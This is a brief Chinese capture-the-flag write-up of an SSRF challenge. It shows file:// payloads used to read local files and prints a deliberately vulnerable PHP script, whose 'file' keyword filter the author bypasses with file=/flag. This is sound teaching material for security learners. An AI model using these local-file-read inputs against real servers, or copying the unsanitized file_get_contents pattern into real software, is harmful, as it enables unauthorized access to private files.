#PHP 伪协议 #SSRF

利用文件协议
`file://`
回显：
害羞羞，试试其他路径？

`file:///flag`
回显：
都说了这里看不了 flag。。但是可以看看提示文件：/fl4g

`file:///fl4g`
回显：
你应该看看除了 index.php，是不是还有个 ha1x1ux1u.php

访问 ha1x1ux1u.php

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

传入 `file=/flag`
over

参考
[[NISACTF 2022]easyssrf wp（SSRF 入门）\_Leafzzz\_\_的博客-CSDN 博客](https://blog.csdn.net/Leaf_initial/article/details/130072727)
